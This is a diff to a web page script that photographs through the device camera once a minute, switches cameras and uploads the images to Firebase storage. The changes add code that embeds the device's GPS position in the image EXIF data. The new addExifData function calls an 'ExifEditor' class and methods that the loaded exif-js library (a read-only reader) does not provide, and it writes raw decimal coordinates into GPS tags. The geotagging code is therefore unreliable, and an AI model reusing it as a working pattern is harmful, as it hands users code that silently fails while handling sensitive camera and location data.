@@ -414,13 +414,14 @@
                 // 1分ごとに撮影してアップロード
                 captureInterval = setInterval(async () => {
                     try {
-                        const photoSettings = { imageWidth: 1920, imageHeight: 1080 }; // 高解像度設定
-                        const photo = await imageCapture.takePhoto(photoSettings);
-                        canvas.width = photo.width;
-                        canvas.height = photo.height;
-                        ctx.drawImage(photo, 0, 0, canvas.width, canvas.height);
+                        const photo = await imageCapture.takePhoto();
+                        const imageBitmap = await createImageBitmap(photo);
+                        canvas.width = imageBitmap.width;
+                        canvas.height = imageBitmap.height;
+                        ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
                         const dataURL = canvas.toDataURL('image/jpeg');
-                        uploadImage(dataURL);
+                        const exifDataURL = await addExifData(dataURL, currentPosition);
+                        uploadImage(exifDataURL);
                         switchCamera();
                     } catch (err) {
                         console.error('画像キャプチャエラー:', err);
@@ -442,18 +443,31 @@
         async function uploadImage(dataURL) {
             try {
                 const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-                const snapshot = await uploadString(storageRef, dataURL, 'data_url');
+                await uploadString(storageRef, dataURL, 'data_url');
                 console.log('画像がアップロードされました。');
-
-                if (currentPosition) {
-                    console.log(`位置情報: 緯度 ${currentPosition.latitude}, 経度 ${currentPosition.longitude}`);
-                }
             } catch (err) {
                 console.error('アップロードエラー:', err);
             }
         }
 
-        // 位置情報を取得
+        // EXIFデータを画像に追加
+        async function addExifData(dataURL, position) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                img.onload = () => {
+                    const exif = new ExifEditor(img);
+                    if (position) {
+                        exif.setTag(0x0002, position.latitude);
+                        exif.setTag(0x0004, position.longitude);
+                    }
+                    const exifDataURL = exif.getDataURL();
+                    resolve(exifDataURL);
+                };
+                img.onerror = reject;
+                img.src = dataURL;
+            });
+        }
+
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -493,5 +507,6 @@
             getLocation();
         };
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
 </body>
 </html>
